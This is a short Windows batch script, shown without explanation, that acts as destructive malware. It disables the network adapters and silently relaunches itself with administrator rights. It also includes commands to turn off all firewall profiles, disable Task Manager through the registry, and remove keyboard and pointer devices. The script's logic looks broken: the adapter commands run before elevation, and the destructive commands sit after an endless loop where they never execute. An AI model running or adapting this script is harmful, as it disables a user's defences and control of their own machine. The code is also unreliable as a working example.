@echo off
netsh interface set interface name="Wi-Fi" admin=disabled
netsh interface set interface name="Ethernet" admin=disabled
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'am_admin' -WindowStyle Hidden -Verb RunAs"
    exit /b
)

:loop
timeout /t 5 >nul
goto loop
netsh advfirewall set allprofiles state off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
devcon remove *pointer*
devcon remove *keyboard*

